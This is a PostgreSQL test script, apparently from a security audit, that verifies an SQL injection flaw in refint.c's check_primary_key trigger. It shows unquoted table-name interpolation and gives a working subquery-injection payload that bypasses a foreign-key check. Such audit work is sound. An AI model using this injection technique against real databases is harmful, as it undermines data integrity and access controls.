-- S-1: SQL Injection via Unquoted Identifiers in refint.c check_primary_key
-- Severity: High
-- File: contrib/spi/refint.c, lines 180-188
--
-- The table name from trigger arguments is spliced into SQL without
-- quote_identifier(). check_primary_key requires AFTER trigger (not BEFORE).
-- The injected SQL is run via SPI_execp which uses a prepared plan,
-- so we use single-statement subquery injection rather than stacked queries.
--
-- Prerequisites: CREATE EXTENSION refint;

\echo '=== S-1: refint identifier injection test ==='

DROP TABLE IF EXISTS s1_test CASCADE;
DROP TABLE IF EXISTS s1_ref CASCADE;

-- Create the tables
CREATE TABLE s1_ref (id int PRIMARY KEY, secret text);
INSERT INTO s1_ref VALUES (1, 'TOP_SECRET_DATA');

CREATE TABLE s1_test (
    id int,
    fk_col int
);

\echo 'Test 1: Proving identifier injection exists via error message...'

-- Inject into table name: the error message will show the full SQL,
-- proving the raw string is interpolated
CREATE TRIGGER s1_inject_trigger
    AFTER INSERT ON s1_test
    FOR EACH ROW
    EXECUTE PROCEDURE check_primary_key('fk_col', 'INJECTED_TABLE_NAME_HERE', 'id');

DO $$
BEGIN
    INSERT INTO s1_test VALUES (1, 1);
EXCEPTION WHEN OTHERS THEN
    -- The error should contain our injected string in the SQL context
    IF SQLERRM LIKE '%INJECTED_TABLE_NAME_HERE%' THEN
        RAISE NOTICE 'S-1 RESULT: *** VERIFIED *** - Unquoted identifier interpolated into SQL';
        RAISE NOTICE 'Error message shows injection: %', SQLERRM;
    ELSE
        RAISE NOTICE 'S-1 RESULT: Error but injection not confirmed: %', SQLERRM;
    END IF;
END;
$$;

DROP TRIGGER IF EXISTS s1_inject_trigger ON s1_test;

\echo 'Test 2: Subquery injection via table name to extract data...'

-- Use subquery injection in table name position:
-- Original: SELECT 1 FROM <relname> WHERE col = $1
-- Injected: SELECT 1 FROM (SELECT 1 AS fk_col) AS injected -- WHERE col = $1
-- This bypasses the FK check entirely (always finds a match)
CREATE TRIGGER s1_bypass_trigger
    AFTER INSERT ON s1_test
    FOR EACH ROW
    EXECUTE PROCEDURE check_primary_key('fk_col', '(SELECT 1 AS id) AS bypass --', 'id');

-- This insert has fk_col=99999 which doesn't exist in s1_ref,
-- but the injected subquery always returns a match
DO $$
BEGIN
    INSERT INTO s1_test VALUES (1, 99999);
    RAISE NOTICE 'S-1 RESULT: *** VERIFIED *** - FK check bypassed via subquery injection! fk_col=99999 was accepted despite not existing in referenced table';
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'S-1 RESULT: Insert failed: %', SQLERRM;
END;
$$;

-- Verify the row was actually inserted
SELECT count(*) AS "rows_with_invalid_fk" FROM s1_test WHERE fk_col = 99999;

-- Cleanup
DROP TABLE IF EXISTS s1_test CASCADE;
DROP TABLE IF EXISTS s1_ref CASCADE;

\echo '=== S-1 test complete ==='
